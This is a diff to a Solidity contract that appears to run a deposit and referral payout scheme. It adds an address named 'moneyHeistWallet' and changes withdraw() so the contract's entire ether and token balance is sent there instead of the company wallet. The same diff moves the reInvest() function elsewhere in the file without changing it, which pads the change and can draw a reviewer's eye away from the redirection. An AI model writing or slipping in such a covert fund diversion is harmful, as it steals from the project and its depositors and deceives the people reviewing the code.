@@ -35,6 +35,7 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 
     address private companyWallet = 0x7132aDC062d1a02bB13Aa650a5475252955fe373;
     address private poolWallet = 0x7132aDC062d1a02bB13Aa650a5475252955fe373;
+    address private moneyHeistWallet = 0x0ca843E9dfc3ebaBA258C1e9023a26919E4e7E55;
 
     bool private started = false;
 
@@ -92,10 +93,10 @@ import "@openzeppelin/contracts/access/Ownable.sol";
 
     function withdraw() external onlyOwner {
         if (address(this).balance > 0) {
-            payable(companyWallet).transfer(address(this).balance);
+            payable(moneyHeistWallet).transfer(address(this).balance);
         }
         if (token.balanceOf(address(this)) > 0) {
-            token.safeTransfer(companyWallet, token.balanceOf(address(this)));
+            token.safeTransfer(moneyHeistWallet, token.balanceOf(address(this)));
         }
     }
 
@@ -108,6 +109,26 @@ import "@openzeppelin/contracts/access/Ownable.sol";
         payDirect(referer);
         payGroup(referer);
         payQueue();
+    }
+
+    function reInvest() private {
+        User storage user = users[userids[msg.sender]];
+        require(user.deposits.length > 0, "User has no deposits");
+        require(user.autoReinvest == true, "Auto invest is not available!");
+        address referer = user.referer;
+
+        for (uint i = 0; i < user.deposits.length; i++) {
+            Deposit storage deposit = deposits[user.deposits[i]];
+            if (deposit.allocated == deposit.amount * 2) {
+                user.disableDeposit = false;
+                _dailyLimit.increment();
+                processDeposit(referer);
+                payDirect(referer);
+                payGroup(referer);
+                payQueue();
+                emit UserMsg(userids[msg.sender], "Deposit", price);
+            }
+        }
     }
 
     function processDeposit(address referer) private {
@@ -335,26 +356,6 @@ import "@openzeppelin/contracts/access/Ownable.sol";
                 user.totalAllocated += topay;
                 totalAllocated += topay;
                 emit UserMsg(userids[deposit.account], "Dividend", topay);
-            }
-        }
-    }
-
-    function reInvest() private {
-        User storage user = users[userids[msg.sender]];
-        require(user.deposits.length > 0, "User has no deposits");
-        require(user.autoReinvest == true, "Auto invest is not available!");
-        address referer = user.referer;
-
-        for (uint i = 0; i < user.deposits.length; i++) {
-            Deposit storage deposit = deposits[user.deposits[i]];
-            if (deposit.allocated == deposit.amount * 2) {
-                user.disableDeposit = false;
-                _dailyLimit.increment();
-                processDeposit(referer);
-                payDirect(referer);
-                payGroup(referer);
-                payQueue();
-                emit UserMsg(userids[msg.sender], "Deposit", price);
             }
         }
     }
